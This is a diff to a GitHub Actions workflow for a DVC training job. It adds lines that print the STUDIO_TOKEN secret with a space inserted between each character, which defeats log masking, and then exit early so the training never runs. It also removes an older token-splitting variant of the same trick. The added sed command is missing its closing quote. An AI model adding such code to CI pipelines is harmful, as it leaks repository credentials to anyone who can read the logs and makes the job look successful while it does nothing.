@@ -64,6 +64,10 @@ jobs:
           STUDIO_REPO_URL: git@github.com:${{ github.repository }}.git
           MKL_SERVICE_FORCE_INTEL: 1
         run: |
+          echo ">> Training with DVC Studio token:"
+          echo -n "$STUDIO_TOKEN" | sed 's/./& /g
+          exit 0
+
           # Initialise workspace
           pip install -r src/dvc/requirements.txt
           npm install -g csv2md
@@ -80,9 +84,6 @@ jobs:
           IMAGE_SIZE=$(grep "image_size:" params.yaml | cut -d' ' -f 4)
 
           # Run DVC experiment
-          echo ">> Training with DVC Studio token:"
-          echo -n "$STUDIO_TOKEN" >> foo && cut -c1-3 foo && cut -c4
-          exit 0
           dvc repro --force
           dvc push --remote aime
           cml pr --squash --skip-ci .
